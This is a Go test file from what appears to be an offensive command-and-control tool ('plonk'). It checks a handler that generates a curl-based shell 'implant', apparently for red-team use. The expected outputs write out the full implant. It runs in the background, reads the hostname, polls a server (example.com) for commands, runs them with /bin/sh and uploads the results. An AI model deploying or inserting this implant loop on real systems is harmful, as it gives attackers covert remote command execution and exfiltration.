package implantsvr

/*
 * curlgen.go
 * Generate a cURL-based "implant"
 * By J. Stuart McMurray
 * Created 20231111
 * Last Modified 20240117
 */

import (
	"crypto/tls"
	"crypto/x509"
	"encoding/pem"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"regexp"
	"testing"

	"github.com/magisterquis/plonk/internal/def"
	"github.com/magisterquis/plonk/internal/server/state"
	"github.com/magisterquis/plonk/lib/plog"
)

const dummyRandom = "RANDOMRANDOM"

func TestHandleCurlGen(t *testing.T) {
	s, lb := newTestServer(t)
	rr, rb := resrec()
	s.handleCurlGen(rr, httptest.NewRequest(
		http.MethodGet,
		def.CurlGenPath,
		nil,
	))
	if http.StatusOK != rr.Code {
		t.Errorf("Incorrect status %d", rr.Code)
	}

	want := `#!/bin/sh

/bin/sh >/dev/null 2>&1 <<'_eof' &

ID="RANDOMRANDOM-$(hostname || uname -n || curl -s file:///proc/sys/kernel/hostname || curl -s file:///etc/hostname || curl -s file:///etc/myname || echo unknown)-$$"

while :; do
        (
                curl -s -m 10 "http://example.com/t/$ID" |
                /bin/sh 2>&1 |
                curl -T. -s -m 10 "http://example.com/o/$ID"
        ) </dev/null &
        sleep 5
done

_eof
`
	if got := removeTemplateRandomID(rb.String()); got != want {
		t.Errorf(
			"Implant from default template incorrect:\n"+
				" got:\n\n%s\n"+
				"want:\n\n%s",
			got,
			want,
		)
	}
	wantLog := `{"time":"","level":"INFO","msg":"Implant generation","parameters":{"RandN":"","URL":"http://example.com"},"host":"example.com","method":"GET","remote_address":"192.0.2.1:1234","url":"/c"}`
	gotLog := plog.RemoveTimestamp(lb.String())
	gotLog = removeLogRandomID(gotLog)
	if gotLog != wantLog {
		t.Errorf(
			"Log from default template incorrect:\n"+
				" got: %s\n"+
				"want: %s",
			gotLog,
			wantLog,
		)
	}
	lb.Reset()

	have := `test {{ .URL }} test`
	want = `test http://example.com test`
	fn := filepath.Join(s.Dir, def.TemplateFile)
	if err := os.WriteFile(fn, []byte(have), 0640); nil != err {
		t.Fatalf("Error writing template to %s: %s", fn, err)
	}
	rr, rb = resrec()
	s.handleCurlGen(rr, httptest.NewRequest(
		http.MethodGet,
		def.CurlGenPath,
		nil,
	))
	if rc := rr.Result().StatusCode; http.StatusOK != rc {
		t.Errorf("Unexpected response code %d", rc)
	}
	if got := rb.String(); got != want {
		t.Errorf(
			"Custom implant generation incorrect\n"+
				"have: %s\n"+
				" got: %s\n"+
				"want: %s",
			have,
			got,
			want,
		)
	}

	wantLog = `{"time":"","level":"INFO","msg":"Implant generation","parameters":{"RandN":"","URL":"http://example.com"},"filename":"implant.tmpl","host":"example.com","method":"GET","remote_address":"192.0.2.1:1234","url":"/c"}`
	gotLog = plog.RemoveTimestamp(lb.String())
	gotLog = removeLogRandomID(gotLog)
	gotLog = regexp.MustCompile(
		`(.*"filename":").*/([^/"]+",".*)`,
	).ReplaceAllString(gotLog, "${1}${2}")
	if gotLog != wantLog {
		t.Errorf(
			"Log from default template incorrect:\n"+
				" got: %s\n"+
				"want: %s",
			gotLog,
			wantLog,
		)
	}
}

func TestHandleCurlGen_SelfSigned(t *testing.T) {
	d := t.TempDir()
	_, lb, sl := plog.NewTestLogger()
	s := &Server{
		Dir:       d,
		SL:        sl,
		SM:        state.NewTestState(t),
		HTTPSAddr: "127.0.0.1:0",
		noSeen:    true,
	}
	if err := s.Start(); nil != err {
		t.Fatalf("Error starting server: %s", err)
	}
	t.Cleanup(func() { s.Stop(nil) })
	lb.Reset()

	res, err := (&http.Client{Transport: &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}}).Get("https://" + s.HTTPSListenAddr() + def.CurlGenPath)
	if nil != err {
		t.Fatalf("Error getting curl loop: %s", err)
	}
	defer res.Body.Close()
	b, err := io.ReadAll(res.Body)
	if nil != err {
		t.Fatalf("Error reading curl loop: %s", err)
	}

	re := regexp.MustCompile(
		`(?s:` +
			`curl -k --pinnedpubkey "sha256//([^"]+)" -s.*` +
			`curl -k --pinnedpubkey "sha256//([^"]+)" -T\. -s.*` +
			`)`,
	)
	ms := re.FindStringSubmatch(string(b))
	if 3 != len(ms) {
		t.Fatalf(
			"Failed to extract SHA256 hashes:\n"+
				"regex: %s\n"+
				"  got: %s"+
				" body:\n%s",
			re,
			ms,
			b,
		)
	}
	if ms[1] != ms[2] {
		t.Fatalf("SHA256 hashes different:\n%s\n%s", ms[1], ms[2])
	}

	var got string
	c, err := tls.Dial("tcp", s.HTTPSListenAddr(), &tls.Config{
		InsecureSkipVerify: true,
		VerifyPeerCertificate: func(
			rawCerts [][]byte,
			verifiedChains [][]*x509.Certificate,
		) error {
			if l := len(rawCerts); 1 != l {
				return fmt.Errorf(
					"got %d raw certs, expected 1",
					l,
				)
			}
			c, err := x509.ParseCertificate(rawCerts[0])
			if nil != err {
				return fmt.Errorf("parsing raw cert: %w", err)
			}

			got, err = pubkeyFingerprint(&tls.Certificate{Leaf: c})
			if nil != err {
				return fmt.Errorf(
					"getting firgerprint: %w",
					err,
				)
			}

			return nil
		},
	})
	if nil != err {
		t.Fatalf("Error getting server cert fingerprint: %s", err)
	}
	defer c.Close()

	if got != ms[1] {
		t.Fatalf(
			"Hash mismatch:\ngenerated: %s\nfrom cert: %s\n",
			got,
			ms[1],
		)
	}
}

func TestPubkeyFingerprint(t *testing.T) {
	for _, c := range []struct {
		have string /* PEM */
		want string
	}{{
		have: `-----BEGIN CERTIFICATE-----
MIIBYjCCAQegAwIBAgIQOEJUa8felsgAbd7C5HFHhjAKBggqhkjOPQQDAjAQMQ4w
DAYDVQQDEwVlenRsczAeFw0yMzEyMTAwMzE5MzNaFw0zMzEyMTAwMzE5MzNaMBAx
DjAMBgNVBAMTBWV6dGxzMFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEkNjBl3Qj
ZH+0zVV3SDaVyajew4wDf83ldt2frR8CIHXAXO4njxAYZmuaxamx5sUz5tL9gH/W
MbVk3cBv91K6KqNDMEEwDgYDVR0PAQH/BAQDAgeAMBMGA1UdJQQMMAoGCCsGAQUF
BwMBMAwGA1UdEwEB/wQCMAAwDAYDVR0RBAUwA4IBKjAKBggqhkjOPQQDAgNJADBG
AiEAv1n2AauKjv/kM1W+hx69I1d5RQyiLc7LqwSgciI/UaICIQDjo/J/fnhD6nUu
uEX+wVujRFwtQpcWwV9avajW1xdkxg==
-----END CERTIFICATE-----`,
		want: "KNtfLL3eRFISnyRc7IBDXo7Vjfzv+CJi0UwsjziRpcQ=",
	}} {
		t.Run("", func(t *testing.T) {
			c := c /* :( */
			b, rest := pem.Decode([]byte(c.have))
			if 0 != len(rest) {
				t.Fatalf("PEM decode left trailing data")
			}
			if 0 == len(b.Bytes) {
				t.Fatalf("PEM decode got no bytes")
			}
			cert, err := x509.ParseCertificate(b.Bytes)
			if nil != err {
				t.Fatalf("Error parsing X509 cert: %s", err)
			}
			got, err := pubkeyFingerprint(
				&tls.Certificate{Leaf: cert},
			)
			if nil != err {
				t.Fatalf("Error generating hash: %s", err)
			}
			if got != c.want {
				t.Errorf(
					"Incorrect hash:\n got: %s\nwant: %s",
					got,
					c.want,
				)
			}
		})
	}
}

func TestRemoveTemplateRandomID(t *testing.T) {
	have := `#!/bin/sh

/bin/sh >/dev/null 2>&1 <<'_eof' &

ID="2t60x0nnmmd4h-$(hostname || uname -n || curl -s file:///proc/sys/kernel/hostname || curl -s file:///etc/hostname || curl -s file:///etc/myname || echo unknown)-$$"

while :; do
	(
		curl -s "example.com/t/$ID" |
		/bin/sh 2>&1 |
		curl --data-binary @- -s "example.com/o/$ID"
	) </dev/null &
	sleep 5
done

_eof`
	want := `#!/bin/sh

/bin/sh >/dev/null 2>&1 <<'_eof' &

ID="` + dummyRandom + `-$(hostname || uname -n || curl -s file:///proc/sys/kernel/hostname || curl -s file:///etc/hostname || curl -s file:///etc/myname || echo unknown)-$$"

while :; do
	(
		curl -s "example.com/t/$ID" |
		/bin/sh 2>&1 |
		curl --data-binary @- -s "example.com/o/$ID"
	) </dev/null &
	sleep 5
done

_eof`

	if got := removeTemplateRandomID(have); want != got {
		t.Fatalf(
			"removeIDRandom failed:\n"+
				"have:\n\n%s\n"+
				"\n got:\n\n%s\n"+
				"\nwant:\n\n%s\n",
			have,
			got,
			want,
		)
	}
}

func removeTemplateRandomID(s string) string {
	return regexp.MustCompile(
		`(ID=")[0-9a-z]+(-\$\(hostname)`,
	).ReplaceAllString(s, "${1}"+dummyRandom+"${2}")
}

func TestRemoveLogRandomID(t *testing.T) {
	for _, c := range []struct {
		have string
		want string
	}{{
		have: `{"time":"","level":"INFO","msg":"Implant generation","parameters":{"RandN":"2h6f496kna0k1","URL":"example.com"},"host":"example.com","method":"GET","remote_address":"192.0.2.1:1234","url":"/c"}`,
		want: `{"time":"","level":"INFO","msg":"Implant generation","parameters":{"RandN":"","URL":"example.com"},"host":"example.com","method":"GET","remote_address":"192.0.2.1:1234","url":"/c"}`,
	}, {
		have: `{"time":"2023-12-09T00:19:23.788320177+01:00","level":"INFO","msg":"Implant generation","parameters":{"RandN":"25b8oa5r9cuy3","URL":"example.com"},"filename":"/tmp/TestHandleCurlGen2103100159/001/implant.tmpl","host":"example.com","method":"GET","remote_address":"192.0.2.1:1234","url":"/c"}`,
		want: `{"time":"2023-12-09T00:19:23.788320177+01:00","level":"INFO","msg":"Implant generation","parameters":{"RandN":"","URL":"example.com"},"filename":"/tmp/TestHandleCurlGen2103100159/001/implant.tmpl","host":"example.com","method":"GET","remote_address":"192.0.2.1:1234","url":"/c"}`,
	}} {
		c := c /* :( */
		t.Run("", func(t *testing.T) {
			if got := removeLogRandomID(c.have); got != c.want {
				t.Fatalf(
					"Incorrect removal:\n"+
						"have: %s\n"+
						" got: %s\n"+
						"want: %s",
					c.have,
					got,
					c.want,
				)
			}
		})
	}
}

func removeLogRandomID(s string) string {
	return regexp.MustCompile(
		`("RandN":")[^"]*(")`,
	).ReplaceAllString(s, "${1}${2}")
}
